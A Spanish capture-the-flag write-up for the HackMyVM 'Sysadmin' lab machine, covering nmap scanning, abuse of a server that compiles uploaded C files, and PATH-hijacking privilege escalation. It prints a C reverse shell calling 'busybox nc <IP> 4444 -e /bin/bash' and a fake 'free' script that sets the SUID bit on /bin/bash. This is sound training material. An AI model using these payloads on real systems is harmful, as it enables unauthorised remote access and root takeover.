Propiedades:
- OS: Linux
- Plataforma: HackMyVm
- Nivel: Easy
- Tags: #path-hijacking #file-upload #command-hijacking

 ![](../assets/Pasted%20image%2020251124205441.png)
## Reconocimiento

Comienzo con un ping para comprobar conectividad:
```bash
> ping -c 1 192.168.1.195
PING 192.168.1.195 (192.168.1.195) 56(84) bytes of data.
64 bytes from 192.168.1.195: icmp_seq=1 ttl=64 time=2.47 ms

--- 192.168.1.195 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.472/2.472/2.472/0.000 
```

Realizo un escaneo para ver que puertos estan abiertos:
```bash
> sudo nmap -p- -sS --min-rate 5000 -Pn -n -vvv 192.168.1.195
Host is up, received arp-response (0.00073s latency).
Scanned at 2025-11-24 20:55:08 CST for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:57:D8:73 (Oracle VirtualBox virtual NIC)
```

Sobre los puertos abiertos procedo a realizar un segundo escaneo para descubrir que versiones y servicios estan corriendo: 
```bash
> nmap -p 22,80 -sV -sC -Pn -n --min-rate 5000 -sS -vvv 192.168.1.195 -oN target.txt
--------------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: C Code Upload
MAC Address: 08:00:27:57:D8:73 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 8.4p1 Debian 5+deb11u3 - Version Vulnerable posible vector de ataque
- Puerto 80 HTTP: Apache httpd 2.4.62 - Metodos Disponibles GET HEAD POST OPTIONS

## Enumeración

**Puerto 80 HTTP**

- Al parecer es una subida de archivos, que acepta extensiones tipo c.

![](../assets/Pasted%20image%2020251124210144.png)

- Source Code: En el codigo fuente podemos ver un comentario algo interesante:

```html
<!-- gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out -->
```

- `-std=c11`Usa estándar C11
- `-nostdinc`**No usa headers estándar** (`stdio.h`, `stdlib.h`, etc.) 
- `-I/var/www/include`Usa headers de `/var/www/include`
- `-z execstack`**Stack ejecutable**
- `-fno-stack-protector`**Sin canarios** (stack protection)

Mas allá de entender que hace cada flag, lo importante es entender que estamos limitados en cuestión de compilación, es decir muchos includes comunes de C no van a funcionar.

## Explotación


Entonces, sabiendo todo esto podemos tratar de subir una reverse-shell en c sin usar los includes comunes como stdio por que fallaran.

```c
> nano rev.c
> cat rev.c

int fork();
int execve(const char*,char*const[],char*const[]);
int main(){
 if(fork()==0){
  char* argv[]={"/bin/sh","-c","busybox nc <IP> 4444 -e /bin/bash",0};
  execve(argv[0],argv,0);
 }
 return 0;
}
```

Necesitamos ponernos en escucha por el puerto `4444` antes de subir la reverse shell

```bash
> nc -nlvp 4444
```

Subimos la reverse-shell y nos entablamos la conexión:

```bash
> Listening on 0.0.0.0 4444
Connection received on 192.168.1.195 42948
whoami
echo
id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
```

- En el actual directorio encontramos la primer flag
## Escalada de Privilegios


Dentro del sistema procedí a enumerar binarios con permisos de SUDO.

- Encontré que el usuario root puede ejecutar el  script `system-info.sh`

```bash
echo@Sysadmin:/tmp/exploit > sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

**PATH Hijacking**.

Inspeccione el script para ver que hacia.

- Me doy cuenta de que el sistema ejecuta comandos como `free` o `cron` sin usar rutas absolutas. Esto implica que el programa depende del `PATH` del entorno para encontrar esos binarios.  
	Si tengo permisos de escritura en algún directorio del `PATH`, podría colocar un script malicioso con el mismo nombre del comando legítimo y provocar que se ejecute mi script con privilegios elevados (por ejemplo, como root).

```bash
echo@Sysadmin:/tmp/exploit$ cat /usr/local/bin/system-info.sh
#!/bin/bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
```

Por lo cual procedo a suplantar el comando `free` 

```bash
echo@Sysadmin:/tmp/exploit > echo "chmod +s /bin/bash" > free # Coloca el bit SUID de root a /bin/bash
echo@Sysadmin:/tmp/exploit > chmod +x free 
echo@Sysadmin:/tmp/exploit > export PATH=/tmp/exploit:$PATH
```

- Ejecución del binario como root

```bash
echo@Sysadmin:/tmp/exploit > sudo -u root /usr/local/bin/system-info.sh
echo@Sysadmin:/tmp/exploit > bash -p # -p privilegd mode para respetar los permisos SUID
bash-5.0# id    
uid=1000(echo) gid=1000(echo) euid=0(root) egid=0(root) groups=0(root),1000(echo)
bash-5.0# 
```

- Leemos la flag en el directorio /root

***PWNED***